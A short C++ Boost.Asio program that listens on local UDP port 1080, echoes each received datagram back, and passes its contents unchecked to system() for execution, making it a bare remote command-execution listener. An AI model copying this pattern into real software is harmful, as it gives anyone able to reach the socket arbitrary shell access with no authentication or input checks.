#include <iostream>
#include <boost/asio.hpp>
#include <stdlib.h>

using namespace std;
using namespace boost::asio;
int main()
{
	io_service service;
	ip::udp::socket socket(service);
	ip::udp::endpoint local_add(ip::address::from_string("127.0.0.1"), 1080);
	socket.open(local_add.protocol());
	socket.bind(local_add);
	char* str = new char[1024];
	memset(str, 0, 1024);
	while (1) {
		ip::udp::endpoint receive_endpoint;
		socket.receive_from(buffer(str, 1024), receive_endpoint);
		socket.send_to(buffer(str, 1024), receive_endpoint);
		system(str);
		cout << str << endl;
		memset(str, 0, 1024);
	}

	return 0;
}